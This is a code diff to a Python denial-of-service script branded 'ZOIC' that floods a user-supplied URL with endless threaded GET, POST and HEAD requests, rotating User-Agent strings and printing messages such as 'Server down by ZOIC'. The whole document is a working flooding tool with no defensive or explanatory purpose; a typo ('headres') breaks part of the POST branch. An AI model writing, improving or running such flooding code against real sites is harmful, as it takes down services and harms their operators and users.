@@ -4,6 +4,7 @@ import asyncio
 import aiohttp
 import threading
 import random
+import time
 
 class TextColors:
     BLACK = '\033[30m'
@@ -119,115 +120,128 @@ def layer7():
         if select == "get" or select.lower() == "1":
             async def send_request(session, url):
                 headers = {
-                    "User-Agent" : random.choice(user_agent)
+                    "User-Agent": random.choice(user_agent)
                 }
                 try:
-                    async with session.get(url) as response:
-                        print(TextColors.CYAN + f"[+] Url : {url} [*] GET Request : {get_requests}" + TextColors.RESET)
+                    async with session.get(url, headers=headers) as response:
+                        print(TextColors.CYAN + f"[+] Url : {url} [*] GET Request sent!" + TextColors.RESET)
                 except aiohttp.ClientConnectorError:
-                    print(TextColors.CRIMSON + f"[-] Server has down by ZOIC !!" + TextColors.RESET)
+                    print(TextColors.CRIMSON + f"[-] Server down has by ZOIC" + TextColors.RESET)
                 except aiohttp.client_exceptions.ServerDisconnectedError:
-                    print(TextColors.CRIMSON + f"[-] Server disconnected ZOIC !!" + TextColors.RESET)
+                    print(TextColors.CRIMSON + f"[-] Server disconnected by ZOIC" + TextColors.RESET)
 
-            async def send_requests(url, get_requests):
+
+            async def send_requests(url, get_request):
                 async with aiohttp.ClientSession() as session:
-                    tasks = [send_request(session, url) for _ in range(get_requests)]
+                    tasks = [send_request(session, url) for _ in range(get_request)]
                     await asyncio.gather(*tasks)
 
-            def send_thread(url, get_requests):
-                while True:
-                    asyncio.run(send_requests(url, get_requests))
 
-            def start_threads(url, threads, get_requests):
+            def send_thread(url, get_request):
+                while True:
+                    asyncio.run(send_requests(url, get_request))
+
+
+            def start_threads(url, num_threads, get_request):
                 threads = []
-                for _ in range(get_requests):
-                    thread = threading.Thread(target=send_thread, args=(url, get_requests))
+                for _ in range(num_threads):
+                    thread = threading.Thread(target=send_thread, args=(url, get_request))
+                    thread.daemon = True 
+                    thread.start()
+                    threads.append(thread)
+
+                while True:
+                    time.sleep(1)
+
+            url = input(TextColors.WHITE + "URL > " + TextColors.RESET)
+            num_threads = int(input(TextColors.WHITE + "Threads (5~30) > " + TextColors.RESET))
+            get_request = int(input("GET Request (1000~5000) > "))
+            print(TextColors.YELLOW + "[*] Loading ZOIC..."+ TextColors.RESET)  
+
+            start_threads(url, num_threads, get_request)
+
+
+        elif select == "post" or select.lower() == "2":
+            async def send_request(session, url):
+                headers = {
+                    "User-Agent": random.choice(user_agent),
+                    "Content-Type": "application/json" 
+                }
+                try:
+                    async with session.post(url , headres=headers) as response:
+                        print(TextColors.CYAN + f"[+] Url : {url} [*] POST Request {post_request}" + TextColors.RESET)
+                except aiohttp.ClientConnectorError:
+                    print(TextColors.CRIMSON + f"[-] Server down has by ZOIC" + TextColors.RESET)
+                except aiohttp.client_exceptions.ServerDisconnectedError:
+                    print(TextColors.CRIMSON + f"[-] Server disconnected by ZOIC" + TextColors.RESET)
+
+            async def send_requests(url, post_request):
+                async with aiohttp.ClientSession() as session:
+                    tasks = [send_request(session, url) for _ in range(post_request)]
+                    await asyncio.gather(*tasks)
+
+            def send_thread(url, post_request):
+                while True:
+                    asyncio.run(send_requests(url, post_request))
+
+            def start_threads(url, num_threads, post_request):
+                threads = []
+                for _ in range(num_threads):
+                    thread = threading.Thread(target=send_thread, args=(url, post_request))
+                    thread.daemon = True 
+                    thread.start()
+                    threads.append(thread)
+
+                while True:
+                    time.sleep(1)
+
+            url = input(TextColors.WHITE + "URL > " + TextColors.RESET)
+            num_threads = int(input(TextColors.WHITE + "Threads (5~30) > " + TextColors.RESET))
+            post_request = int(input("POST Request (1000~5000) > "))
+            print(TextColors.YELLOW + "[*] Loading ZOIC..." + TextColors.RESET)
+
+            start_threads(url, num_threads, post_request)
+
+        elif select == "head" or select.lower() == "3":
+            async def send_head_request(session, url):
+                headers = {
+                    "User-Agent": random.choice(user_agent)
+                }
+                try:
+                    async with session.head(url, headers=headers) as response:
+                        print(TextColors.CYAN + f"[+] Url : {url} [*] HEAD Request sent!" + TextColors.RESET)
+                except aiohttp.ClientConnectorError:
+                    print(TextColors.CRIMSON + f"[-] Server down by ZOIC !!" + TextColors.RESET)
+                except aiohttp.client_exceptions.ServerDisconnectedError:
+                    print(TextColors.CRIMSON + f"[-] Server disconnected by ZOIC !!" + TextColors.RESET)
+                except Exception as e:
+                    print(TextColors.CRIMSON + f"[-] Unexpected error: {str(e)}" + TextColors.RESET)
+
+            async def send_requests(url, head_requests):
+                async with aiohttp.ClientSession() as session:
+                    tasks = [send_head_request(session, url) for _ in range(head_requests)]
+                    await asyncio.gather(*tasks)
+
+            def send_thread(url, head_requests):
+                while True:
+                    asyncio.run(send_requests(url, head_requests))
+
+            def start_threads(url, num_threads, head_requests):
+                threads = []
+                for _ in range(num_threads):
+                    thread = threading.Thread(target=send_thread, args=(url, head_requests))
+                    thread.daemon = True  
                     thread.start()
                     threads.append(thread)
 
                 for thread in threads:
                     thread.join()  
 
-            url = input(TextColors.WHITE + "URL > "+ TextColors.RESET)
-            threads = int(input(TextColors.WHITE + "Thread (5~35) > "+ TextColors.RESET))  
-            get_requests = int(input(TextColors.WHITE + "Get (5~35) > "+ TextColors.RESET))    
+            url = input(TextColors.WHITE + "URL > " + TextColors.RESET)
+            threads = int(input(TextColors.WHITE + "Threads (5~30) > " + TextColors.RESET))  
+            head_requests = int(input(TextColors.WHITE + "HEAD Requests (1000~5000) > " + TextColors.RESET))  
 
-            start_threads(url, threads, get_requests)
-
-
-        elif select == "post" or select.lower() == "2":
-            async def send_post_request(session, url):
-                headers = {
-                    "User-Agent" : random.choice(user_agent)
-                }
-                try:
-                    async with session.post(url) as response:
-                        print(TextColors.CYAN + f"[+] Url : {url} [*] POST Request : {post_requests}" + TextColors.RESET)
-                except aiohttp.ClientConnectorError:
-                    print(TextColors.CRIMSON + f"[-] Server has down by ZOIC !!" + TextColors.RESET)
-                except aiohttp.client_exceptions.ServerDisconnectedError:
-                    print(TextColors.CRIMSON + f"[-] Server disconnected by ZOIC !!" + TextColors.RESET)
-
-            async def send_requests(url, num_requests):
-                async with aiohttp.ClientSession() as session:
-                    tasks = [send_post_request(session, url) for _ in range(num_requests)]
-                    await asyncio.gather(*tasks)
-
-            def send_thread(url, num_requests):
-                while True:
-                    asyncio.run(send_requests(url, num_requests))
-
-            def start_threads(url, num_threads, num_requests):
-                threads = []
-                for _ in range(num_threads):
-                    thread = threading.Thread(target=send_thread, args=(url, num_requests))
-                    thread.start()
-                    threads.append(thread)
-
-                for thread in threads:
-                    thread.join()
-
-            url = input(TextColors.WHITE + "URL > "+ TextColors.RESET)
-            threads = int(input(TextColors.WHITE + "Thread (5~35) > "+ TextColors.RESET))  
-            post_requests = int(input(TextColors.WHITE + "Get (5~35) > "+ TextColors.RESET))   
-
-            start_threads(url, threads, post_requests)
-
-        elif select == "head" or select.lower() == "3":
-            async def send_head_request(session, url):
-                headers = {
-                    "User-Agent" : random.choice(user_agent)
-                }
-                try:
-                    async with session.head(url) as response:
-                        print(TextColors.CYAN + f"[+] Url : {url} [*] HEAD Request : {head_requests}" + TextColors.RESET)
-                except aiohttp.ClientConnectorError:
-                    print(TextColors.CRIMSON + f"[-] Server has down by ZOIC !!" + TextColors.RESET)
-                except aiohttp.client_exceptions.ServerDisconnectedError:
-                    print(TextColors.CRIMSON + f"[-] Server disconnected by ZOIC !!" + TextColors.RESET)
-
-            async def send_requests(url, num_requests):
-                async with aiohttp.ClientSession() as session:
-                    tasks = [send_head_request(session, url) for _ in range(num_requests)]
-                    await asyncio.gather(*tasks)
-
-            def send_thread(url, num_requests):
-                while True:
-                    asyncio.run(send_requests(url, num_requests))
-
-            def start_threads(url, num_threads, num_requests):
-                threads = []
-                for _ in range(num_threads):
-                    thread = threading.Thread(target=send_thread, args=(url, num_requests))
-                    thread.start()
-                    threads.append(thread)
-
-                for thread in threads:
-                    thread.join()
-
-            url = input(TextColors.WHITE + "URL > "+ TextColors.RESET)
-            threads = int(input(TextColors.WHITE + "Thread (5~35) > "+ TextColors.RESET))  
-            head_requests = int(input(TextColors.WHITE + "Get (5~35) > "+ TextColors.RESET))  
+            print(TextColors.YELLOW + "[*] Loading ZOIC..." + TextColors.RESET)
 
             start_threads(url, threads, head_requests)
 
